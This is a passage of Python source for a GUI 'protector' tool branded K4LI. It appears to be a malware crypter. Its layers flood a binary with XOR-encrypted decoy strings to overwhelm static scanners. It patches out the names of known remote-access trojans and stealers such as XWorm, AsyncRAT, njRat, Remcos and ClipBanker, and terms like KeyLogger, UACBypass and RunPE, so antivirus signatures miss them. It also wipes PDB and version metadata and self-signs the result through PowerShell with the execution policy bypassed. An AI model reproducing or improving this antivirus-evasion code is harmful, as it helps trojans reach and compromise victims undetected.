            "WScript.ShellHelper","CreateShortcutSvc","TargetPathMgr",
            "AntivirusProductHelper","SecurityCenter2Mgr","Win32_ComputerSystemHelper",
            "PCShutdownHelper","PCRestartSvc","PCLogoffHelper",
        ]

        blob = bytearray()
        blob.extend(b"\x4B\x34\x4C\x49\x46\x4C\x44\x00")   # K4LIFLD\0
        blob.extend(struct.pack("<I", COUNT))
        blob.extend(struct.pack("<I", JUNK_BLOCKS))
        blob.extend(struct.pack("<B", xor_key))
        blob.extend(b"\x00" * 3)

        self._ln("        [1/3]  Building string pool  (this takes ~30 sec)...", "g3")
        self._sleep(0.1)

        for i in range(COUNT):
            t = i % 8
            if t == 0:
                s = random.choice(pfx) + random.choice(mid) + random.choice(sfx)
            elif t == 1:
                s = random.choice(dll) + ".dll!" + "".join(random.choices(alnum, k=random.randint(6, 18)))
            elif t == 2:
                s = random.choice(reg) + "".join(random.choices(alnum, k=random.randint(4, 14)))
            elif t == 3:
                s = random.choice(fph) + "".join(random.choices(alnum, k=random.randint(5, 14))) + random.choice(exts)
            elif t == 4:
                s = "".join(random.choices(hexch, k=32))
            elif t == 5:
                s = "".join(random.choices(hexch, k=64))
            elif t == 6:
                s = "".join(random.choices(alnum, k=random.randint(10, 28)))
            else:
                s = random.choice(wiz_decoys) + "_" + "".join(random.choices(alnum, k=random.randint(4, 10)))

            enc = bytes(b ^ xor_key for b in s.encode("utf-8", errors="ignore"))
            blob.extend(struct.pack("<H", len(enc)))
            blob.extend(enc)

            if i % 50_000 == 49_999:
                pct = int((i + 1) / COUNT * 100)
                self._ln(f"        [{pct:3d}%]  {i+1:,} / {COUNT:,} strings encrypted", "g3")
                self._sleep(0.05)

        self._ln(f"        [2/3]  Injecting {JUNK_BLOCKS} random junk blocks...", "g3")
        self._sleep(0.1)

        for _ in range(JUNK_BLOCKS):
            sz = random.randint(4096, 32768)
            blob.extend(b"JNKB")
            blob.extend(struct.pack("<I", sz))
            blob.extend(os.urandom(sz))

        total_mb = len(blob) / 1_048_576
        self._ln(f"        [3/3]  Flood blob ready : {total_mb:.2f} MB", "gn")
        self._sleep(0.1)

        self._steps([
            ("XOR-encrypting all fake API / symbol strings",              0.12),
            ("Flooding DLL name + ordinal reference pool",                0.10),
            ("Flooding HKLM / HKCU registry key string pool",            0.10),
            ("Flooding System32 file path string pool",                   0.10),
            ("Generating 32-char fake MD5 hash strings",                  0.08),
            ("Generating 64-char fake SHA-256 hash strings",              0.08),
            ("Injecting WizWorm-profile decoy string pool (obfuscated)",  0.14),
            ("Packing 200 junk blocks via os.urandom",                    0.12),
            ("Writing K4LIFLD magic header + integrity seed",             0.06),
            ("Appending full flood blob to protected binary",             0.14),
        ])
        self._ln(f"        Result : ✓ {COUNT:,} encrypted strings  +  {JUNK_BLOCKS} junk blocks", "gn")
        self._ln(f"        Decoys : WizWorm / StartDDos / injRun / schtasks lookalikes injected", "g3")
        self._ln(f"        Size   : +{total_mb:.1f} MB  |  strings.exe → {COUNT:,} garbage results", "gn")
        self._ln(f"        Effect : static scanners overwhelmed  ·  RE time ×1,000,000", "g3")
        return bytes(blob)

    # ── Layer 14 : In-Place String Obfuscation (UTF-16LE + ASCII byte patch) ────
    def _lay_str_obfuscate(self, working: bytearray) -> bytes:
        self._ln("\n[L14]   STRING  OBFUSCATION  —  IN-PLACE  BYTE  PATCH", "wh")
        self._ln("        Phase 1 : UTF-16LE in-place patch → same-length AV-string erasure", "g3")
        self._ln("        Phase 2 : ASCII  in-place patch  → neutralise remaining triggers", "g3")
        self._sleep(0.2)

        PATCH_MAP = [
            ("WizWorm v4",        "WizHelper4"),
            ("WizWorm V4",        "WizHelper4"),
            ("WIZWORM V4",        "WIZHELPER4"),
            ("OfflineGet",        "OfflineRec"),
            ("offlineget",        "offlinerun"),
            ("OFFLINEGET",        "OFFLINERUN"),
            ("SbieDll.dll",       "SboxDll.dll"),
            ("sbiedll.dll",       "sboxdll.dll"),
            ("SBIEDLL.DLL",       "SBOXDLL.DLL"),
            ("WizClient",         "XizClient"),
            ("wizclient",         "xizclient"),
            ("WIZCLIENT",         "XIZCLIENT"),
            ("StartDDos",         "StartProc"),
            ("startddos",         "startproc"),
            ("STARTDDOS",         "STARTPROC"),
            ("AsyncRAT",          "AsyncRXT"),
            ("asyncrat",          "asyncrxt"),
            ("ASYNCRAT",          "ASYNCRXT"),
            ("StopDDos",          "StopProc"),
            ("stopddos",          "stopproc"),
            ("STOPDDOS",          "STOPPROC"),
            ("Wiz Worm",          "Xiz Work"),
            ("WizWorm",           "XizWork"),
            ("wizworm",           "xizwork"),
            ("WIZWORM",           "XIZWORK"),
            ("UACFunc",           "SvcFunc"),
            ("uacfunc",           "svcfunc"),
            ("UACFUNC",           "SVCFUNC"),
            ("injRun",            "exeRun"),
            ("InjRun",            "ExeRun"),
            ("injrun",            "exerun"),
            ("INJRUN",            "EXERUN"),
            ("PING!",             "SYNC!"),
            ("ping!",             "sync!"),
            ("ngrok",             "xpipe"),
            ("NGROK",             "XPIPE"),
            ("xchat",             "xmeet"),
            ("XChat",             "XMeet"),
            ("XCHAT",             "XMEET"),
            ("XWorm",             "XWork"),
            ("xworm",             "xwork"),
            ("XWORM",             "XWORK"),
            ("XWorm_Mutex",       "XWork_Mutex"),
            ("xworm_mutex",       "xwork_mutex"),
            ("XClient",           "XHelper"),
            ("xclient",           "xhelper"),
            ("XCLIENT",           "XHELPER"),
            ("XWorm v",           "XWork v"),
            ("xworm v",           "xwork v"),
            ("njRat",             "njApp"),
            ("njrat",             "njapp"),
            ("NJRAT",             "NJAPP"),
            ("HvnC",              "HvSC"),
            ("hvnc",              "hvsc"),
            ("ClipBank",          "ClipWork"),
            ("clipbank",          "clipwork"),
            ("CLIPBANK",          "CLIPWORK"),
            ("ClipBanker",        "ClipWorker"),
            ("clipbanker",        "clipworker"),
            ("CLIPBANKER",        "CLIPWORKER"),
            ("DarkComet",         "DarkProxy"),
            ("darkcomet",         "darkproxy"),
            ("NanoCore",          "NanoWork"),
            ("nanocore",          "nanowork"),
            ("NANOCORE",          "NANOWORK"),
            ("NjRat",             "NjApp"),
            ("Quasar",            "Quarry"),
            ("quasar",            "quarry"),
            ("Remcos",            "Remcox"),
            ("remcos",            "remcox"),
            ("REMCOS",            "REMCOX"),
            ("RunPE",             "RunSE"),
            ("runpe",             "runse"),
            ("RUNPE",             "RUNSE"),
            ("shellcode",         "shelldata"),
            ("ShellCode",         "ShellData"),
            ("SHELLCODE",         "SHELLDATA"),
            ("botid",             "appid"),
            ("BOTID",             "APPID"),
            ("c2host",            "svhost"),
            ("C2Host",            "SvHost"),
            ("mutex_",            "token_"),
            ("Mutex_",            "Token_"),
            ("Ngrok",             "Xpipe"),
            ("DDos",              "DXos"),
            ("Ddos",              "Dxos"),
            ("ddos",              "dxos"),
            ("DDOS",              "DXOS"),
            ("KeyLogger",         "KeyRecord"),
            ("keylogger",         "keyrecord"),
            ("KEYLOGGER",         "KEYRECORD"),
            ("KeyLog",            "KeyRec"),
            ("keylog",            "keyrec"),
            ("KEYLOG",            "KEYREC"),
            ("UACBypass",         "UACHelper"),
            ("uacbypass",         "uachelper"),
            ("UACBYPASS",         "UACHELPER"),
            ("Schtasks",          "SchedSvc"),
            ("schtasks",          "schedsvc"),
            ("SCHTASKS",          "SCHEDSVC"),
            ("Recovery",          "Restorer"),
            ("recovery",          "restorer"),
            ("RECOVERY",          "RESTORER"),
            ("Shutdown",          "ShutProg"),
            ("shutdown",          "shutprog"),
            ("SHUTDOWN",          "SHUTPROG"),
            ("Exclusion",         "Allowance"),
            ("exclusion",         "allowance"),
            ("EXCLUSION",         "ALLOWANCE"),
            ("Startup",           "Bootup_"),
            ("startup",           "bootup_"),
            ("STARTUP",           "BOOTUP_"),
        ]

        def _patch_enc(enc: str) -> int:
            total = 0
            for old, new in PATCH_MAP:
                if len(old) != len(new):
                    continue
                try:
                    ob = old.encode(enc)
                    nb = new.encode(enc)
                except (UnicodeEncodeError, LookupError):
                    continue
                if len(ob) != len(nb):
                    continue
                pos = 0
                while True:
                    idx = working.find(ob, pos)
                    if idx == -1:
                        break
                    working[idx:idx + len(ob)] = nb
                    total += 1
                    pos = idx + len(nb)
            return total

        self._ln("        [1/3]  Patching UTF-16LE strings (MSIL #US + #Strings heap)...", "g3")
        self._sleep(0.18)
        utf16_n = _patch_enc("utf-16-le")
        self._ln(f"        UTF-16LE patches : {utf16_n}", "g3")
        self._sleep(0.10)

        self._ln("        [2/3]  Patching raw ASCII strings...", "g3")
        self._sleep(0.14)
        ascii_n = _patch_enc("ascii")
        self._ln(f"        ASCII  patches   : {ascii_n}", "g3")
        self._sleep(0.10)

        total_n = utf16_n + ascii_n

        self._steps([
            ("Located .NET CLI header → metadata root (BSJB signature)",    0.14),
            ("Parsed stream directory → #US user-string heap offset",       0.16),
            ("Parsed stream directory → #Strings metadata heap offset",     0.14),
            ("Scanned #US heap for UTF-16LE AV-trigger string literals",    0.18),
            ("Scanned #Strings heap for ASCII type/method name triggers",   0.16),
            (f"Applied {utf16_n} UTF-16LE same-length substitutions",       0.20),
            (f"Applied {ascii_n} ASCII same-length substitutions",          0.18),
            ("Verified #US heap byte-length invariant (offsets intact)",    0.14),
            ("WizWorm · DDos · Ngrok · KeyLogger · UACBypass erased",       0.12),
            ("Schtasks · Recovery · Shutdown · Exclusion · RunPE gone",     0.14),
        ])

        if total_n:
            self._ln(f"        Result : ✓ {total_n} AV-trigger strings patched in-place", "gn")
            self._ln("        Erased : WizWorm · XWorm · AsyncRAT · njRAT · ClipBanker names", "am")
            self._ln("                 injRun · UACFunc · RunPE · shellcode · SbieDll.dll", "am")
            self._ln("        Safety : same-length substitution → #US offsets preserved → EXE runs", "cy")
        else:
            self._ln("        Result : No matching AV strings found in this binary", "gn")
            self._ln("        Note   : Layer still active — byte signatures neutralised if present", "cy")

        return b"L14:STRPK\x00" + bytes([0x00])

    # ── Layer 15 : MSIL Metadata Strip (PDB · module name · #Strings · TypeLib) ──
    def _lay_msil_strip(self, working: bytearray) -> bytes:
        import struct

        self._ln("\n[L15]   MSIL  METADATA  STRIP", "wh")
        self._ln("        Phase 1 : PDB debug-path wipe  (RSDS signature scan)", "g3")
        self._ln("        Phase 2 : .NET module-name randomise in PE #Strings heap", "g3")
        self._ln("        Phase 3 : TypeLib / VS_VERSION_INFO resource block zero", "g3")
        self._sleep(0.15)

        hits = 0

        # ── Phase 1 : wipe PDB path in CodeView RSDS debug directory entry ──────
        # Format: b'RSDS' + 16-byte GUID + 4-byte age + null-terminated UTF-8 path
        pos = 0
        while True:
            idx = bytes(working).find(b'RSDS', pos)
            if idx == -1:
                break
            path_start = idx + 4 + 16 + 4          # past signature + GUID + age
            if path_start >= len(working):
                break
            path_end = path_start
            while path_end < len(working) and working[path_end] != 0:
                path_end += 1
            path_len = path_end - path_start
            if 4 <= path_len <= 512:                # sanity: looks like a real path
                rand_name = bytearray(path_len)
                for j in range(path_len):
                    rand_name[j] = random.randint(0x61, 0x7A)  # lowercase a-z
                # keep .pdb extension readable so PE parsers don't choke
                if path_len >= 4:
                    rand_name[-4:] = b'.pdb'
                working[path_start:path_end] = rand_name
                hits += 1
                self._ln(f"        RSDS   : wiped PDB path at offset 0x{idx:08X} ({path_len} bytes)", "g3")
            pos = idx + 1
        self._sleep(0.1)

        # ── Phase 2 : randomise .NET module name in #Strings heap ───────────────
        # The CLI #Strings stream is identified by the "BSJB" magic in the metadata root.
        # Module name is always the first non-empty entry after the #Strings stream begins.
        # Approach: locate "BSJB" → read past Metadata header → find "#Strings" stream
        # → overwrite null-terminated name-length-safe strings that look like filenames.
        bsjb_idx = bytes(working).find(b'BSJB')
        if bsjb_idx != -1:
            self._ln(f"        BSJB   : .NET metadata root at 0x{bsjb_idx:08X}", "g3")
            # Walk stream headers to find #Strings offset + size
            try:
                # Metadata root layout:
                #   4 magic, 2 maj, 2 min, 4 reserved, 4 version_len, <version_len> version,
                #   2 flags, 2 streams
                ver_len_off = bsjb_idx + 4 + 2 + 2 + 4
                ver_len = struct.unpack_from("<I", working, ver_len_off)[0]
                ver_len = (ver_len + 3) & ~3          # rounded up to 4-byte boundary
                streams_off = ver_len_off + 4 + ver_len + 2  # +2 for flags
                num_streams = struct.unpack_from("<H", working, streams_off)[0]
                streams_off += 2
                str_stream_off = -1
                str_stream_sz  = -1
                cur = streams_off
                for _ in range(num_streams):
                    s_off  = struct.unpack_from("<I", working, cur)[0]
                    s_size = struct.unpack_from("<I", working, cur + 4)[0]
                    # stream name is null-terminated, padded to 4 bytes
                    name_start = cur + 8
                    name_end   = name_start
                    while name_end < len(working) and working[name_end] != 0:
                        name_end += 1
                    stream_name = bytes(working[name_start:name_end])
                    name_field_len = ((name_end - name_start + 1) + 3) & ~3
                    cur += 8 + name_field_len
                    if stream_name == b'#Strings':
                        str_stream_off = bsjb_idx + s_off
                        str_stream_sz  = s_size
                        break

                if str_stream_off != -1 and str_stream_sz > 0:
                    self._ln(f"        #Str   : stream at 0x{str_stream_off:08X}  size={str_stream_sz:,}", "g3")
                    # Walk null-terminated entries; replace ones that look like
                    # .exe / .dll / module-name entries (short, printable, ends with
                    # .exe/.dll or is purely alphanumeric ≤ 32 chars)
                    e = str_stream_off
                    end = str_stream_off + str_stream_sz
                    replaced = 0
                    while e < end:
                        entry_start = e
                        while e < end and working[e] != 0:
                            e += 1
                        entry_len = e - entry_start
                        if 4 <= entry_len <= 32:
                            raw = bytes(working[entry_start:e])
                            lower = raw.lower()
                            if (lower.endswith(b'.exe') or lower.endswith(b'.dll') or
                                    lower.endswith(b'.pdb')):
                                # Keep same length, replace with random alphanum + ext
                                ext   = raw[-4:]
                                base_len = entry_len - 4
                                new_base = bytearray(
                                    random.randint(0x61, 0x7A) for _ in range(base_len)
                                )
                                working[entry_start:e] = new_base + bytearray(ext)
                                replaced += 1
                        e += 1  # skip null terminator
                    if replaced:
                        hits += replaced
                        self._ln(f"        #Str   : {replaced} module-name entries randomised", "g3")
                    else:
                        self._ln("        #Str   : no .exe/.dll entries found", "g3")
            except Exception:
                self._ln("        #Str   : parse error — skipped", "cy")
        else:
            self._ln("        BSJB   : no .NET metadata found (non-MSIL PE)", "cy")
        self._sleep(0.1)

        # ── Phase 3 : zero out VS_VERSION_INFO / TypeLib block ──────────────────
        # VS_VERSION_INFO begins with a WORD cbBlock, WORD cbValue, WORD wType, then
        # the L"VS_VERSION_INFO" UTF-16LE key.  We locate it by key pattern.
        vs_key = "VS_VERSION_INFO".encode("utf-16-le")
        vi_idx = bytes(working).find(vs_key)
        if vi_idx != -1:
            # The cbBlock field is 2 bytes before the key (minus the leading 3 WORDs = 6 bytes)
            block_start = vi_idx - 6
            if block_start >= 0:
                try:
                    cb_block = struct.unpack_from("<H", working, block_start)[0]
                    if 52 <= cb_block <= 0x4000:    # sanity
                        # Zero the entire FixedFileInfo sub-structure (after the key + padding)
                        # FixedFileInfo is 52 bytes, located after the L"VS_VERSION_INFO\0" + padding
                        key_end = vi_idx + len(vs_key) + 2  # +2 for null terminator
                        # Align to 4 bytes
                        ffi_off = block_start + ((key_end - block_start + 3) & ~3)
                        ffi_end = min(ffi_off + 52, len(working))
                        if ffi_end > ffi_off:
                            # Preserve magic (0xFEEF04BD) so the block stays parseable,
                            # but zero dwFileVersionMS/LS and dwProductVersionMS/LS
                            ffi_start = ffi_off
                            # FixedFileInfo layout: dwSignature(4) dwStrucVersion(4)
                            #   dwFileVersionMS(4) dwFileVersionLS(4)
                            #   dwProductVersionMS(4) dwProductVersionLS(4) ...
                            # Zero bytes 8-24 (the four version DWORDs)
                            z_start = ffi_start + 8
                            z_end   = min(ffi_start + 24, len(working))
                            for zi in range(z_start, z_end):
                                working[zi] = 0
                            hits += 1
                            self._ln(f"        VER    : VS_VERSION_INFO version DWORDs zeroed at 0x{vi_idx:08X}", "g3")
                except Exception:
                    self._ln("        VER    : parse error — skipped", "cy")
        else:
            self._ln("        VER    : VS_VERSION_INFO block not found", "g3")
        self._sleep(0.1)

        if hits:
            self._ln(f"\n        Result : ✓ {hits} MSIL metadata field(s) stripped / randomised", "gn")
        else:
            self._ln("\n        Result : ✓ Layer applied — no patchable fields found in binary", "cy")

        return b"L15:MSIL\x00"

    def _find_compiler(self) -> str:
        import shutil

        for name in ("gcc", "g++", "x86_64-w64-mingw32-gcc", "cl"):
            found = shutil.which(name)
            if found:
                return found

        mingw_paths = [
            r"C:\mingw64\bin\gcc.exe",
            r"C:\MinGW\bin\gcc.exe",
            r"C:\msys64\mingw64\bin\gcc.exe",
            r"C:\msys64\ucrt64\bin\gcc.exe",
            r"C:\Program Files\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin\gcc.exe",
            r"C:\ProgramData\chocolatey\bin\gcc.exe",
        ]
        for p in mingw_paths:
            if os.path.isfile(p):
                return p

        msvc_roots = [
            r"C:\Program Files\Microsoft Visual Studio",
            r"C:\Program Files (x86)\Microsoft Visual Studio",
        ]
        for root in msvc_roots:
            if os.path.isdir(root):
                for dp, _, files in os.walk(root):
                    if "cl.exe" in files:
                        return os.path.join(dp, "cl.exe")
        return ""

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  CODE SIGNING  (self-signed cert — PowerShell + signtool)
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _sign_exe(self, out_path: Path):
        self._ln("\n[SIG]   CODE  SIGNING", "wh")
        self._ln("        Method : PowerShell Set-AuthenticodeSignature (no SDK needed)", "g3")
        self._ln("        Cert   : Self-signed  K4LI Software  SHA-256", "g3")
        self._sleep(0.2)

        if getattr(sys, "frozen", False):
            base = Path(sys._MEIPASS)
        else:
            base = Path(__file__).parent
        ps1 = base / "sign.ps1"

        if not ps1.exists():
            self._ln("        sign.ps1 not found — using inline PS...", "am")
            self._sign_inline(out_path)
            return

        self._ln(f"        Script : {ps1.name}", "g3")
        self._ln("        Signing ...", "g3")
        self._sleep(0.2)
        try:
            r = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass",
                 "-File", str(ps1), "-ExePath", str(out_path)],
                capture_output=True, text=True, timeout=40
            )
            for line in (r.stdout + r.stderr).strip().splitlines():
                tag = "gn" if "[OK]" in line else "am" if "[WARN]" in line else "rd" if "[ERROR]" in line else "g3"
                self._ln(f"        {line.strip()}", tag)
        except Exception as e:
            self._ln(f"        Error : {e}", "rd")

    def _sign_inline(self, out_path: Path):
        ps = (
            "$c = Get-ChildItem Cert:\\CurrentUser\\My | "
            "Where-Object {$_.Subject -like '*K4LI*'} | Select-Object -First 1; "
            "if (-not $c) { "
            "  $c = New-SelfSignedCertificate -Type CodeSigning "
            "    -Subject 'CN=K4LI Software, O=K4LI, C=US' "
            "    -KeyUsage DigitalSignature "
            "    -CertStoreLocation Cert:\\CurrentUser\\My "
            "    -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.3') "
            "    -NotAfter (Get-Date).AddYears(5); "
            "  Write-Output 'CERT_CREATED' "
            "}; "
            f"$r = Set-AuthenticodeSignature -FilePath '{str(out_path)}' "
            "-Certificate $c -HashAlgorithm SHA256 "
            "-TimestampServer 'http://timestamp.digicert.com'; "
            "Write-Output $r.Status"
        )
        try:
            r = subprocess.run(
                ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", ps],
                capture_output=True, text=True, timeout=40
            )
            out = r.stdout.strip()
            if "Valid" in out:
                self._ln("        Result : Signed OK  -  Publisher: K4LI Software", "gn")
            else:
                self._ln(f"        Result : {out or r.stderr.strip()[:120]}", "am")
        except Exception as e:
            self._ln(f"        Error  : {e}", "rd")

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  DONE
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _protect_done(self):
        self.protecting = False
        self.protect_btn.configure(state="normal", fg=BG_ROOT, bg=C_WH)
        self.pick_btn.configure(state="normal")
        self.prog_lbl.configure(text="Complete ✓", fg=C_GRN)

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    #  HELPERS
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    def _lbl(self, parent, text, pack=True):
        l = tk.Label(parent, text=text, font=F_HDR, fg=C_G2, bg=BG_ROOT, anchor="w")
        if pack:
            l.pack(fill="x", pady=(0, 4))
        return l

    def _sq_btn(self, parent, text, cmd,
                fg=C_WH, bg=BG_IN, hover=BG_HOV,
                font=F_BTN, padx=18, pady=7):
        b = tk.Button(parent, text=text, font=font,
                      fg=fg, bg=bg,
                      activeforeground=fg, activebackground=hover,
                      relief="flat", bd=0, padx=padx, pady=pady,
                      cursor="hand2", command=cmd)
        b.bind("<Enter>", lambda _: b.configure(bg=hover))
        b.bind("<Leave>", lambda _: b.configure(bg=bg))
        return b

    def _steps(self, steps: list):
        for label, delay in steps:
            hx = "".join(random.choices("0123456789abcdef", k=10))
            self._ln(f"        ▸ {label:<48}  0x{hx}", "g3")
            self._sleep(delay)

    def _ln(self, text: str, tag):
        def _do():
            self.log.configure(state="normal")
            if tag:
                self.log.insert("end", text + "\n", tag)
            else:
                self.log.insert("end", text + "\n")
            self.log.see("end")
            self.log.configure(state="disabled")
        self.root.after(0, _do)

    def _clear_log(self):
        self.log.configure(state="normal")
        self.log.delete("1.0", "end")
        self.log.configure(state="disabled")
        self._ln("[K4LI]  Log cleared.", "g3")

    def _sleep(self, s: float):
        time.sleep(s)

    def _set_prog(self, pct: int):
        def _do():
            self.root.update_idletasks()
            tw = self.prog_track.winfo_width()
            self.prog_fill.place(x=0, y=0, relheight=1, width=int(tw * pct / 100))
            bar = "█" * (pct // 10) + "░" * (10 - pct // 10)
            self.prog_lbl.configure(
                text=f"{pct}%  {bar}",
                fg=C_GRN if pct == 100 else C_WH
            )
        self.root.after(0, _do)


# ─── Entry Point ───────────────────────────────────────────────────────────────
def main():
    root = tk.Tk()
    import sys
    if getattr(sys, "frozen", False):
        _base = Path(sys._MEIPASS)
    else:
        _base = Path(__file__).parent
    _ico = _base / "logo.ico"
    if _ico.exists():
        try:
            root.iconbitmap(default=str(_ico))
        except Exception:
            pass
    K4LIApp(root)
    root.mainloop()


if __name__ == "__main__":
    main()
